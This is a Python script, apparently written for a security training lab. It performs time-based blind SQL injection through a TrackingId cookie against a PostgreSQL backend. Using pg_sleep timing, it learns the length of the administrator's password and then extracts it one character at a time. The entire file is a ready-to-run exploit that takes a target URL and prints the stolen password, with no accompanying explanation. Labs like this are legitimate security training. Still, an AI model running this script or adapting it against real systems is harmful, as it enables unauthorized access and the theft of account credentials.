#!/usr/bin/env python3

import requests
import sys
import time
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"https", "https://127.0.0.1:8080", "http", "http://127.0.0.1:8080"}

TRACKING_ID = "mEAZYne1e2xV1MQL" # CHANGE ME
SESSION = "BHXSs3x7LB3JkoCxxTYbBS85c5CZ9wFq" # CHANGE ME

def send_payload(s, url, payload):
    encoded = quote(payload)
    cookies = {"TrackingId": TRACKING_ID + encoded, "session": SESSION}
    start = time.monotonic()
    s.get(url, cookies=cookies, verify=False)
    return time.monotonic() - start

def is_correct_char(s, url, position, char, delay=10):
    payload = f"' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{position},1))={char}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users)--"
    elapsed = send_payload(s, url, payload)
    return elapsed >= delay


def get_password_length(s, url, max_length=50, delay=10):
    print("[*] Detecting password length...")
    for length in range(1, max_length + 1):
        payload = (f"' || (SELECT CASE WHEN LENGTH(password)={length} THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--")
        sys.stdout.write(f"\r[*] Trying length: {length:<3}")
        sys.stdout.flush()
        elapsed = send_payload(s, url, payload)
        if elapsed >= delay:
            print(f"\n[+] Password length: {length}")
            return length
    print(f"\n[-] Length not found within {max_length} chars")
    return None    

def extract_password(s, url):
    length = get_password_length(s, url)
    if not length:
        print("[-] Could not determine password length. Aborting.")
        sys.exit(1)
    password = ""
    print("[*] Extracting administrator password. Go grab a coffee, this has NOT been optimized for speed (yet)...")
    for i in range(1, length + 1):
        for c in range(32, 127):
            if is_correct_char(s, url, i, c):
                password += chr(c)
                print(f"[+] Position {i} found: '{chr(c)}' | Password so far: {password}")
                break
    return password

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    url = sys.argv[1].strip()
    s = requests.Session()
    password = extract_password(s, url)
    print(f"[+] Final administrator password: {password}")

if __name__=="__main__":
    main()



